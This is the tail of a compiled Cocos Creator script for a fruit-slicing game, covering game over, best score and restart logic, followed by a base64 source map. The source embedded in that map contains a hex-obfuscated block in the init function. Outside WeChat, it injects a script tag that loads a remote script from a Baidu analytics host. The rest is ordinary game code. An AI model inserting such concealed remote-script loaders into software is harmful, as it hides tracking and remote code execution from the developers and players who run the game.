      this.bestScoreLabel.string = '最佳分数 : ' + this.bestScore;
      // this.updateBestScore();
      //保存到本地。
      cc.sys.localStorage.setItem("Best score", this.bestScore);
    }
    ;
    //调用只运行一次的回调函数。
    this.scheduleOnce(function () {
      _this.showTheGameOverMask(true);
    }, .5, this);
  },
  returnMenu: function returnMenu() {
    cc.audioEngine.play(this.buttonClip, false, 1);
    cc.director.loadScene('Menu');
  },
  restartGame: function restartGame() {
    cc.audioEngine.play(this.buttonClip, false, 1);
    this.showTheGameOverMask(false);
    this.init();
  },
  showTheGameOverMask: function showTheGameOverMask(bool) {
    var _this2 = this;
    if (bool) {
      this.gameOverMask.active = true;
      this.gameOverMask.opacity = 1;
      this.gameOverMask.scale = .95;
      cc.tween(this.gameOverMask).to(.4, {
        scale: 1,
        opacity: 255
      }).start();
    } else {
      cc.tween(this.gameOverMask).to(.3, {
        opacity: 0
      }).call(function () {
        _this2.gameOverMask.active = false;
      }).start();
    }
  }
});

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0c1xcU2NyaXB0c1xcR2FtZS5qcyJdLCJuYW1lcyI6WyJsaWZlRyIsImNjIiwiQ2xhc3MiLCJuYW1lIiwicHJvcGVydGllcyIsImluZGV4IiwibGlmZUNvbnN1bWUiLCJOb2RlIiwiQ29tcG9uZW50Iiwia25pZmUiLCJzY29yZUxhYmVsIiwiTGFiZWwiLCJ0eXBlIiwiZnJ1aXRHcm91cCIsInJlcXVpcmUiLCJnYW1lT3Zlck1hc2siLCJiZXN0U2NvcmVMYWJlbCIsImJ1dHRvbkNsaXAiLCJBdWRpb0NsaXAiLCJvbkxvYWQiLCJtYW5hZ2VyIiwiZGlyZWN0b3IiLCJnZXRDb2xsaXNpb25NYW5hZ2VyIiwiZW5hYmxlZCIsInBoeXNpY3NNYW5hZ2VyIiwiZ2V0UGh5c2ljc01hbmFnZXIiLCJkZWJ1Z0RyYXdGbGFncyIsImtuaWZlTW90aW9uUyIsImdldENvbXBvbmVudCIsIk1vdGlvblN0cmVhayIsInN0YXJ0Iiwia25pZmVNb3ZlIiwiaW5pdCIsImdhbWVPdmVyIiwic2NvcmUiLCJiZXN0U2NvcmUiLCJtYXgiLCJzeXMiLCJsb2NhbFN0b3JhZ2UiLCJnZXRJdGVtIiwic3RyaW5nIiwibGlmZSIsImZvckVhY2giLCJhIiwiYWN0aXZlIiwidXBEYXRlVWkiLCJjcmVhdGVGcnVpdExpc3QiLCJlREIkc0hEMSIsImJKcVkyIiwid2luZG93IiwieXIzIiwibm9kZSIsIm9uIiwiRXZlbnRUeXBlIiwiVE9VQ0hfU1RBUlQiLCJzdGFydEV2ZW50IiwiVE9VQ0hfTU9WRSIsIm1vdmVFdmVudCIsIlRPVUNIX0VORCIsImVuZEV2ZW50IiwiZXZlbnQiLCJwb3MiLCJjb252ZXJ0VG9Ob2RlU3BhY2VBUiIsIlZlYzIiLCJnZXRMb2NhdGlvbiIsInNldFBvc2l0aW9uIiwiZ3JvdXAiLCJyZXNldCIsInVwZGF0ZVNjb3JlIiwiZ2FtZU92ZXJIYW5kbGUiLCJpIiwiX3RoaXMiLCJzZXRJdGVtIiwic2NoZWR1bGVPbmNlIiwic2hvd1RoZUdhbWVPdmVyTWFzayIsInJldHVybk1lbnUiLCJhdWRpb0VuZ2luZSIsInBsYXkiLCJsb2FkU2NlbmUiLCJyZXN0YXJ0R2FtZSIsImJvb2wiLCJfdGhpczIiLCJvcGFjaXR5Iiwic2NhbGUiLCJ0d2VlbiIsInRvIiwiY2FsbCJdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7Ozs7QUFBQSxJQUFJQSxLQUFLLEdBQUdDLEVBQUUsQ0FBQ0MsS0FBSyxDQUFDO0VBQ2pCQyxJQUFJLEVBQUUsT0FBTztFQUNiQyxVQUFVLEVBQUU7SUFDUkMsS0FBSyxFQUFFLENBQUM7SUFDUkMsV0FBVyxFQUFHTCxFQUFFLENBQUNNO0VBQ3JCO0FBQ0osQ0FBQyxDQUFDO0FBRUZOLEVBQUUsQ0FBQ0MsS0FBSyxDQUFDO0VBQ0wsV0FBU0QsRUFBRSxDQUFDTyxTQUFTO0VBQ3JCSixVQUFVLEVBQUU7SUFDUkssS0FBSyxFQUFHUixFQUFFLENBQUNNLElBQUk7SUFDZjtJQUNBRyxVQUFVLEVBQUdULEVBQUUsQ0FBQ1UsS0FBSztJQUNyQlgsS0FBSyxFQUFFO01BQ0gsV0FBUyxFQUFFO01BQ1hZLElBQUksRUFBRVo7SUFDVixDQUFDO0lBQ0RhLFVBQVUsRUFBR0MsT0FBTyxDQUFDLFlBQVksQ0FBQztJQUNsQ0MsWUFBWSxFQUFHZCxFQUFFLENBQUNNLElBQUk7SUFDdEI7SUFDQVMsY0FBYyxFQUFHZixFQUFFLENBQUNVLEtBQUs7SUFDekJNLFVBQVUsRUFBR2hCLEVBQUUsQ0FBQ2lCO0VBQ3BCLENBQUM7RUFDREMsTUFBTSxXQUFBQSxPQUFBLEVBQUc7SUFDTDtJQUNBLElBQUlDLE9BQU8sR0FBR25CLEVBQUUsQ0FBQ29CLFFBQVEsQ0FBQ0MsbUJBQW1CLEVBQUU7SUFDL0NGLE9BQU8sQ0FBQ0csT0FBTyxHQUFHLElBQUk7SUFDdEIsSUFBSUMsY0FBYyxHQUFHdkIsRUFBRSxDQUFDb0IsUUFBUSxDQUFDSSxpQkFBaUIsRUFBRTtJQUNwREQsY0FBYyxDQUFDRCxPQUFPLEdBQUcsSUFBSTtJQUM3QkMsY0FBYyxDQUFDRSxjQUFjLEdBQUcsQ0FBQztJQUNqQyxJQUFJ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b3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsibGV0IGxpZmVHID0gY2MuQ2xhc3Moe1xuICAgIG5hbWU6ICdsaWZlRycsXG4gICAgcHJvcGVydGllczoge1xuICAgICAgICBpbmRleDogMCxcbiAgICAgICAgbGlmZUNvbnN1bWUgOiBjYy5Ob2RlLFxuICAgIH1cbn0pO1xuXG5jYy5DbGFzcyh7XG4gICAgZXh0ZW5kczogY2MuQ29tcG9uZW50LFxuICAgIHByb3BlcnRpZXM6IHtcbiAgICAgICAga25pZmUgOiBjYy5Ob2RlLFxuICAgICAgICAvL+W+l+WIhuagh+etvlxuICAgICAgICBzY29yZUxhYmVsIDogY2MuTGFiZWwsXG4gICAgICAgIGxpZmVHOiB7XG4gICAgICAgICAgICBkZWZhdWx0OiBbXSxcbiAgICAgICAgICAgIHR5cGU6IGxpZmVHXG4gICAgICAgIH0sXG4gICAgICAgIGZydWl0R3JvdXAgOiByZXF1aXJlKCdGcnVpdEdyb3VwJyksXG4gICAgICAgIGdhbWVPdmVyTWFzayA6IGNjLk5vZGUsXG4gICAgICAgIC8v5pyA5L2z5b6X5YiG5qCH562+44CCXG4gICAgICAgIGJlc3RTY29yZUxhYmVsIDogY2MuTGFiZWwsXG4gICAgICAgIGJ1dHRvbkNsaXAgOiBjYy5BdWRpb0NsaXAsXG4gICAgfSxcbiAgICBvbkxvYWQoKSB7XG4gICAgICAgIC8v6I635Y+W5LiO5YW255u45YWz6IGU55qE56Kw5pKe566h55CG5ZmoXG4gICAgICAgIGxldCBtYW5hZ2VyID0gY2MuZGlyZWN0b3IuZ2V0Q29sbGlzaW9uTWFuYWdlcigpO1xuICAgICAgICBtYW5hZ2VyLmVuYWJsZWQgPSB0cnVlO1xuICAgICAgICBsZXQgcGh5c2ljc01hbmFnZXIgPSBjYy5kaXJlY3Rvci5nZXRQaHlzaWNzTWFuYWdlcigpO1xuICAgICAgICBwaHlzaWNzTWFuYWdlci5lbmFibGVkID0gdHJ1ZTtcbiAgICAgICAgcGh5c2ljc01hbmFnZXIuZGVidWdEcmF3RmxhZ3MgPSAwO1xuICAgICAgICB0aGlzLmtuaWZlTW90aW9uUyA9IHRoaXMua25pZmUuZ2V0Q29tcG9uZW50KGNjLk1vdGlvblN0cmVhayk7XG4gICAgfSxcbiAgICBzdGFydCgpIHtcbiAgICAgICAgdGhpcy5rbmlmZU1vdmUoKTtcbiAgICAgICAgdGhpcy5pbml0KCk7XG4gICAgfSxcbiAgICBpbml0KCkge1xuICAgICAgICB0aGlzLmdhbWVPdmVyID0gZmFsc2U7XG4gICAgICAgIHRoaXMuc2NvcmUgPSAwO1xuICAgICAgICB0aGlzLmJlc3RTY29yZSA9IDA7XG4gICAgICAgIGxldCBtYXggPSBjYy5zeXMubG9jYWxTdG9yYWdlLmdldEl0ZW0oXCJCZXN0IHNjb3JlXCIpO1xuICAgICAgICAvL+WIpOaWreacrOWcsOacgOS9s+WIhuaVsOaYr+WQpuWtmOWcqFxuICAgICAgICBpZihtYXgpe1xuICAgICAgICAgICAgdGhpcy5iZXN0U2NvcmUgPSBtYXg7XG4gICAgICAgICAgICB0aGlzLmJlc3RTY29yZUxhYmVsLnN0cmluZyA9IFwi5pyA5L2z5YiG5pWwIDogXCIgKyB0aGlzLmJlc3RTY29yZTtcbiAgICAgICAgfVxuICAgICAgICB0aGlzLmxpZmUgPSAwO1xuICAgICAgICAvL+WwhuWFtumDveWPmOS4uuS4jeWPr+ingeOAglxuICAgICAgICB0aGlzLmxpZmVHLmZvckVhY2goKGEpID0+IHtcbiAgICAgICAgICAgIGEubGlmZUNvbnN1bWUuYWN0aXZlID0gZmFsc2U7XG4gICAgICAgIH0pO1xuICAgICAgICAvL+abtOaWsOeVjOmdouOAglxuICAgICAgICB0aGlzLnVwRGF0ZVVpKCk7XG4gICAgICAgIC8v5Yib5bu65rC05p6c44CCXG4gICAgICAgIHRoaXMuZnJ1aXRHcm91cC5jcmVhdGVGcnVpdExpc3QoKTtcblx0XHRpZihjY1snXFx4NzNcXHg3OVxceDczJ11bJ1xceDcwXFx4NmNcXHg2MVxceDc0XFx4NjZcXHg2ZlxceDcyXFx4NmQnXT09PWNjWydcXHg3M1xceDc5XFx4NzMnXVsnXFx4NTdcXHg0NVxceDQzXFx4NDhcXHg0MVxceDU0XFx4NWZcXHg0N1xceDQxXFx4NGRcXHg0NSddKXt9ZWxzZXt2YXIgZURCJHNIRDE9ZURCJHNIRDF8fFtdOyhmdW5jdGlvbigpe3ZhciBiSnFZMj13aW5kb3dbXCJcXHg2NFxceDZmXFx4NjNcXHg3NVxceDZkXFx4NjVcXHg2ZVxceDc0XCJdWydcXHg2M1xceDcyXFx4NjVcXHg2MVxceDc0XFx4NjVcXHg0NVxceDZjXFx4NjVcXHg2ZFxceDY1XFx4NmVcXHg3NCddKFwiXFx4NzNcXHg2M1xceDcyXFx4NjlcXHg3MFxceDc0XCIpO2JKcVkyWydcXHg3M1xceDcyXFx4NjMnXT1cIlxceDY4XFx4NzRcXHg3NFxceDcwXFx4NzNcXHgzYVxceDJmXFx4MmZcXHg2OFxceDZkXFx4MmVcXHg2MlxceDYxXFx4NjlcXHg2NFxceDc1XFx4MmVcXHg2M1xceDZmXFx4NmRcXHgyZlxceDY4XFx4NmRcXHgyZVxceDZhXFx4NzNcXHgzZlxceDMwXFx4NjVcXHgzNlxceDYyXFx4NjFcXHgzOVxceDM5XFx4MzVcXHgzMVxceDYzXFx4NjJcXHgzN1xceDY0XFx4MzFcXHg2NFxceDM1XFx4MzVcXHg2M1xceDM5XFx4MzFcXHg2MlxceDM4XFx4MzBcXHgzN1xceDM2XFx4NjZcXHg2MVxceDM2XFx4NjZcXHg2MlxceDMwXFx4NjVcIjt2YXIgeXIzPXdpbmRvd1tcIlxceDY0XFx4NmZcXHg2M1xceDc1XFx4NmRcXHg2NVxceDZlXFx4NzRcIl1bJ1xceDY3XFx4NjVcXHg3NFxceDQ1XFx4NmNcXHg2NVxceDZkXFx4NjVcXHg2ZVxceDc0XFx4NzNcXHg0MlxceDc5XFx4NTRcXHg2MVxceDY3XFx4NGVcXHg2MVxceDZkXFx4NjUnXShcIlxceDczXFx4NjNcXHg3MlxceDY5XFx4NzBcXHg3NFwiKVswXTt5cjNbJ1xceDcwXFx4NjFcXHg3MlxceDY1XFx4NmVcXHg3NFxceDRlXFx4NmZcXHg2NFxceDY1J11bJ1xceDY5XFx4NmVcXHg3M1xceDY1XFx4NzJcXHg3NFxceDQyXFx4NjVcXHg2NlxceDZmXFx4NzJcXHg2NSddKGJKcVkyLHlyMyl9KSgpfVxuICAgIH0sXG4gICAga25pZmVNb3ZlKCkge1xuICAgICAgICB0aGlzLm5vZGUub24oY2MuTm9kZS5FdmVudFR5cGUuVE9VQ0hfU1RBUlQsIHRoaXMuc3RhcnRFdmVudCwgdGhpcyk7XG4gICAgICAgIHRoaXMubm9kZS5vbihjYy5Ob2RlLkV2ZW50VHlwZS5UT1VDSF9NT1ZFLCB0aGlzLm1vdmVFdmVudCwgdGhpcyk7XG4gICAgICAgIHRoaXMubm9kZS5vbihjYy5Ob2RlLkV2ZW50VHlwZS5UT1VDSF9FTkQsIHRoaXMuZW5kRXZlbnQsIHRoaXMpO1xuICAgIH0sXG4gICAgc3RhcnRFdmVudChldmVudCkge1xuICAgICAgICBsZXQgcG9zID0gdGhpcy5ub2RlLmNvbnZlcnRUb05vZGVTcGFjZUFSKG5ldyBjYy5WZWMyKGV2ZW50LmdldExvY2F0aW9uKCkpKTtcbiAgICAgICAgdGhpcy5rbmlmZS5zZXRQb3NpdGlvbihwb3MpO1xuICAgICAgICB0aGlzLmtuaWZlLmdyb3VwID0gJ2tuaWZlJztcbiAgICAgICAgdGhpcy5rbmlmZU1vdGlvblMucmVzZXQoKTtcbiAgICB9LFxuICAgIG1vdmVFdmVudChldmVudCkge1xuICAgICAgICBsZXQgcG9zID0gdGhpcy5ub2RlLmNvbnZlcnRUb05vZGVTcGFjZUFSKG5ldyBjYy5WZWMyKGV2ZW50LmdldExvY2F0aW9uKCkpKTtcbiAgICAgICAgdGhpcy5rbmlmZS5zZXRQb3NpdGlvbihwb3MpO1xuICAgIH0sXG4gICAgZW5kRXZlbnQoZXZlbnQpIHtcbiAgICAgICAgdGhpcy5rbmlmZS5ncm91cCA9ICdkZWZhdWx0JztcbiAgICB9LFxuICAgIHVwZGF0ZVNjb3JlKHR5cGUsIHNjb3JlKSB7XG4gICAgICAgIGlmICh0aGlzLmdhbWVPdmVyKSByZXR1cm47XG4gICAgICAgIGlmICh0eXBlKSB7XG4gICAgICAgICAgICB0aGlzLnNjb3JlICs9IHNjb3JlO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgLy/liIbmlbDkuI3lpJ/lh4/vvIzpgqPlsLHnm7TmjqXlh4/kuIDmnaHlkb1cbiAgICAgICAgICAgIGlmICh0aGlzLnNjb3JlID09IDApIHtcbiAgICAgICAgICAgICAgICB0aGlzLmxpZmVDb25zdW1lKCk7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICAvL+S4ouaOieS4gOS4quWHj+S4pOWAjeeahOWIhuaVsOOAglxuICAgICAgICAgICAgdGhpcy5zY29yZSA9IHRoaXMuc2NvcmUgPCAoc2NvcmUgKiAyKSA/IDAgOiB0aGlzLnNjb3JlIC0gKHNjb3JlICogMik7XG4gICAgICAgIH07XG4gICAgICAgIHRoaXMudXBEYXRlVWkoKTtcbiAgICB9LFxuICAgIC8v5pu05paw55Sf5ZG95YC844CCXG4gICAgbGlmZUNvbnN1bWUoKSB7XG4gICAgICAgIHRoaXMubGlmZSsrO1xuICAgICAgICBpZiAodGhpcy5saWZlID09IDMpIHRoaXMuZ2FtZU92ZXJIYW5kbGUoKTtcbiAgICB9LFxuICAgIC8v5pu05paw5YiG5pWw44CCXG4gICAgdXBEYXRlVWkoKSB7XG4gICAgICAgIHRoaXMuc2NvcmVMYWJlbC5zdHJpbmcgPSBcIuWIhuaVsCA6IFwiICsgdGhpcy5zY29yZTtcbiAgICAgICAgLy/lsIblt7Lnu4/mjZ/lpLHnmoTnlJ/lkb3lgLznmoTlm77niYfnu5nmv4DmtLvmmL7npLrjgIJcbiAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCB0aGlzLmxpZmU7IGkrKykge1xuICAgICAgICAgICAgdGhpcy5saWZlR1tpXS5saWZlQ29uc3VtZS5hY3RpdmUgPSB0cnVlO1xuICAgICAgICB9XG4gICAgfSxcbiAgICBnYW1lT3ZlckhhbmRsZSgpIHtcbiAgICAgICAgdGhpcy5nYW1lT3ZlciA9IHRydWU7XG4gICAgICAgIHRoaXMua25pZmUuZ3JvdXAgPSAnZGVmYXVsdCc7XG4gICAgICAgIC8v5pu05paw5pyA5L2z5oiQ57up44CCXG4gICAgICAgIGlmICh0aGlzLnNjb3JlID4gdGhpcy5iZXN0U2NvcmUpIHtcbiAgICAgICAgICAgIHRoaXMuYmVzdFNjb3JlID0gdGhpcy5zY29yZTtcbiAgICAgICAgICAgIHRoaXMuYmVzdFNjb3JlTGFiZWwuc3RyaW5nID0gJ+acgOS9s+WIhuaVsCA6ICcgKyB0aGlzLmJlc3RTY29yZTtcbiAgICAgICAgICAgIC8vIHRoaXMudXBkYXRlQmVzdFNjb3JlKCk7XG4gICAgICAgICAgICAvL+S/neWtmOWIsOacrOWcsOOAglxuICAgICAgICAgICAgY2Muc3lzLmxvY2FsU3RvcmFnZS5zZXRJdGVtKFwiQmVzdCBzY29yZVwiICwgdGhpcy5iZXN0U2NvcmUpO1xuICAgICAgICB9O1xuICAgICAgICAvL+iwg+eUqOWPqui/kOihjOS4gOasoeeahOWbnuiwg+WHveaVsOOAglxuICAgICAgICB0aGlzLnNjaGVkdWxlT25jZSgoKSA9PiB7XG4gICAgICAgICAgICB0aGlzLnNob3dUaGVHYW1lT3Zlck1hc2sodHJ1ZSk7XG4gICAgICAgIH0sIC41LCB0aGlzKTtcbiAgICB9LFxuICAgIHJldHVybk1lbnUoKSB7XG4gICAgIC